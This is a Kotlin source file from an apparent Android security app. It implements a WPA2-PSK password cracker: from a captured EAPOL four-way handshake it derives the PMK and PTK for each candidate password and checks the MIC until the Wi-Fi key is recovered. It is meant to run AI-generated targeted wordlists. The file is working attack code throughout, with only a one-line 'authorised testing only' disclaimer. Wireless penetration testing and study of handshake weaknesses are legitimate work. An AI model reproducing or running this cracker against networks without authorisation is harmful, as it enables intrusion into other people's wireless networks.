package com.example.cydcompanion.ai

import com.example.cydcompanion.domain.EapolFrameInfo
import com.example.cydcompanion.domain.TargetProfile
import com.example.cydcompanion.domain.WordlistCandidate
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.ByteArrayOutputStream
import javax.crypto.Mac
import javax.crypto.SecretKeyFactory
import javax.crypto.spec.PBEKeySpec
import javax.crypto.spec.SecretKeySpec

/**
 * WPA2-PSK verifier inspired by Mr. CrackBot AI Nano's handshake cracking pipeline.
 *
 * Rather than GPU-accelerated hashcat (Jetson Nano approach), this runs on Android CPU
 * using the standard JVM crypto stack:
 *   1. PMK = PBKDF2-HMAC-SHA1(password, SSID, 4096 rounds, 32 bytes)
 *   2. PTK = PRF-512(PMK, "Pairwise key expansion", AA/SA nonces)
 *   3. MIC = HMAC-SHA1(KCK, EAPOL_M2_with_zeroed_MIC)[0..15]  — for CCMP
 *      MIC = HMAC-MD5 (KCK, EAPOL_M2_with_zeroed_MIC)[0..15]  — for TKIP
 *   4. Compare computed MIC with captured MIC from EAPOL M2
 *
 * Suitable for targeted "smart" wordlists (AI-generated, 10–500 candidates) where
 * each trial takes ~15 ms on a mid-range Android device (PBKDF2 bottleneck).
 *
 * ⚠ Educational / authorised testing only.
 */
object WpaVerifier {

    data class VerifyResult(
        val found: Boolean,
        val password: String?,
        val trialsCompleted: Int,
        val elapsedMs: Long,
        val error: String? = null
    )

    // ------------------------------------------------------------------
    // Public API
    // ------------------------------------------------------------------

    /**
     * Run a full CPU crack attempt against [profile] using [candidates].
     * Calls [onProgress] (tried, total, currentCandidate) on each trial so the UI can update.
     * Returns as soon as a match is found.
     */
    suspend fun crack(
        profile: TargetProfile,
        candidates: List<WordlistCandidate>,
        onProgress: (Int, Int, String) -> Unit = { _, _, _ -> }
    ): VerifyResult = withContext(Dispatchers.Default) {
        val started = System.currentTimeMillis()

        // We need M2 (SNonce + MIC set) and must know ANonce from M1 or M3
        val m2 = profile.frames.firstOrNull { it.messageNum == 2 }
        val anonce = profile.frames.firstOrNull { it.messageNum == 1 }?.nonce
            ?: profile.frames.firstOrNull { it.messageNum == 3 }?.nonce

        if (m2 == null || anonce == null) {
            return@withContext VerifyResult(
                found = false, password = null, trialsCompleted = 0,
                elapsedMs = 0L,
                error = "Need M1+M2 or M3+M2 — only mask 0x${"%02X".format(profile.eapolMask)} captured"
            )
        }

        if (m2.eapolHex.length < 190) {          // EAPOL frame must be at least 95 bytes
            return@withContext VerifyResult(
                found = false, password = null, trialsCompleted = 0,
                elapsedMs = 0L, error = "M2 EAPOL frame too short to verify MIC"
            )
        }

        val apMac  = hexToBytes(profile.bssid.replace(":", ""))
        val staMac = profile.clientMac?.let { hexToBytes(it.replace(":", "")) }
            ?: return@withContext VerifyResult(
                found = false, password = null, trialsCompleted = 0,
                elapsedMs = 0L, error = "No client MAC in profile"
            )

        val ssidBytes  = profile.ssid.toByteArray(Charsets.UTF_8)
        val aNonceBytes = hexToBytes(anonce)
        val sNonceBytes = hexToBytes(m2.nonce)
        val capturedMic = m2.mic.uppercase()
        val eapolBytes  = hexToBytes(m2.eapolHex)
        val useSha1Mic  = m2.keyDescVersion >= 2   // CCMP=2 → HMAC-SHA1; TKIP=1 → HMAC-MD5

        for ((idx, candidate) in candidates.withIndex()) {
            onProgress(idx + 1, candidates.size, candidate.password)

            val match = runCatching {
                verifyCandidate(
                    password    = candidate.password,
                    ssid        = ssidBytes,
                    apMac       = apMac,
                    staMac      = staMac,
                    aNonce      = aNonceBytes,
                    sNonce      = sNonceBytes,
                    eapolM2     = eapolBytes,
                    capturedMic = capturedMic,
                    useSha1Mic  = useSha1Mic
                )
            }.getOrElse { false }

            if (match) {
                return@withContext VerifyResult(
                    found = true,
                    password = candidate.password,
                    trialsCompleted = idx + 1,
                    elapsedMs = System.currentTimeMillis() - started
                )
            }
        }

        VerifyResult(
            found = false, password = null,
            trialsCompleted = candidates.size,
            elapsedMs = System.currentTimeMillis() - started
        )
    }

    // ------------------------------------------------------------------
    // Core crypto
    // ------------------------------------------------------------------

    /**
     * Returns true if [password] produces the same MIC as captured in the M2 EAPOL frame.
     */
    fun verifyCandidate(
        password: String,
        ssid: ByteArray,
        apMac: ByteArray,
        staMac: ByteArray,
        aNonce: ByteArray,
        sNonce: ByteArray,
        eapolM2: ByteArray,
        capturedMic: String,
        useSha1Mic: Boolean = true
    ): Boolean {
        val pmk = derivePmk(password, ssid)
        val ptk = derivePtk(pmk, apMac, staMac, aNonce, sNonce)
        val kck = ptk.copyOf(16)

        // Zero the MIC field in eapolM2 (bytes 77–92 of the EAPOL payload,
        // but inside the raw captured EAPOL the MIC starts at absolute offset 77)
        val eapolZeroed = eapolM2.copyOf()
        val micOffset = findMicOffset(eapolZeroed)
        if (micOffset < 0) return false
        for (i in micOffset until (micOffset + 16)) {
            if (i < eapolZeroed.size) eapolZeroed[i] = 0
        }

        val computedMic = if (useSha1Mic) {
            hmac("HmacSHA1", kck, eapolZeroed).copyOf(16)
        } else {
            hmac("HmacMD5", kck, eapolZeroed).copyOf(16)
        }

        return computedMic.toHex().uppercase() == capturedMic.uppercase()
    }

    /** PBKDF2-HMAC-SHA1 — same as wpa_supplicant's pbkdf2_sha1() */
    fun derivePmk(password: String, ssid: ByteArray): ByteArray {
        val spec = PBEKeySpec(password.toCharArray(), ssid, 4096, 256) // 256 bits = 32 bytes
        val factory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1")
        return factory.generateSecret(spec).encoded
    }

    /**
     * PRF-512 for PTK as per IEEE 802.11-2020 s12.7.1.2.
     * Uses HMAC-SHA1 for WPA2-CCMP.
     * "Pairwise key expansion" is the fixed label.
     */
    fun derivePtk(
        pmk: ByteArray,
        apMac: ByteArray,
        staMac: ByteArray,
        aNonce: ByteArray,
        sNonce: ByteArray
    ): ByteArray {
        // B = min(AA,SA)||max(AA,SA)||min(ANonce,SNonce)||max(ANonce,SNonce)
        val (macMin, macMax) = orderBytes(apMac, staMac)
        val (nonceMin, nonceMax) = orderBytes(aNonce, sNonce)

        val bStream = ByteArrayOutputStream(76)
        bStream.write(macMin); bStream.write(macMax)
        bStream.write(nonceMin); bStream.write(nonceMax)
        val bBytes = bStream.toByteArray()

        val prf = ByteArrayOutputStream(80)
        val label = "Pairwise key expansion".toByteArray(Charsets.US_ASCII)
        var counter = 0
        while (prf.size() < 64) {
            val mac = Mac.getInstance("HmacSHA1")
            mac.init(SecretKeySpec(pmk, "HmacSHA1"))
            mac.update(label)
            mac.update(0x00.toByte())
            mac.update(bBytes)
            mac.update(counter.toByte())
            prf.write(mac.doFinal())
            counter++
        }
        return prf.toByteArray().copyOf(64)
    }

    // ------------------------------------------------------------------
    // Helpers
    // ------------------------------------------------------------------

    /** Lexicographic min/max for two byte arrays. */
    private fun orderBytes(a: ByteArray, b: ByteArray): Pair<ByteArray, ByteArray> {
        for (i in a.indices) {
            val ai = a[i].toInt() and 0xFF
            val bi = if (i < b.size) b[i].toInt() and 0xFF else 0
            if (ai < bi) return Pair(a, b)
            if (ai > bi) return Pair(b, a)
        }
        return Pair(a, b)
    }

    /**
     * Find the EAPOL MIC field offset.
     * In a raw EAPOL-Key frame the structure is:
     *   0       : descriptor type  (1 byte)
     *   1-2     : key information  (2 bytes)
     *   3-4     : key length       (2 bytes)
     *   5-12    : replay counter   (8 bytes)
     *   13-44   : ANonce/SNonce    (32 bytes)
     *   45-60   : Key IV           (16 bytes)
     *   61-68   : Key RSC          (8 bytes)
     *   69-76   : reserved         (8 bytes)
     *   77-92   : MIC              (16 bytes)  ← THIS IS THE OFFSET
     */
    private fun findMicOffset(eapol: ByteArray): Int {
        // Look for EAPOL start: 0x02 0x03 ... (EAPOL version, EAPOL-Key type)
        for (i in 0 until eapol.size - 5) {
            if ((eapol[i].toInt() and 0xFF) == 0x02 &&
                (eapol[i + 1].toInt() and 0xFF) == 0x03) {
                // i+4 is start of EAPOL-Key body; MIC is at offset 77 from body start
                return i + 4 + 77
            }
        }
        // If no EAPOL header found, assume it starts at offset 0 (stripped header case)
        return if (eapol.size >= 93) 77 else -1
    }

    private fun hmac(algorithm: String, key: ByteArray, data: ByteArray): ByteArray {
        val mac = Mac.getInstance(algorithm)
        mac.init(SecretKeySpec(key, algorithm))
        return mac.doFinal(data)
    }

    fun hexToBytes(hex: String): ByteArray {
        val clean = hex.replace(" ", "").replace(":", "").replace("-", "")
        return ByteArray(clean.length / 2) { i ->
            clean.substring(i * 2, i * 2 + 2).toInt(16).toByte()
        }
    }

    private fun ByteArray.toHex(): String = joinToString("") { "%02x".format(it) }
}
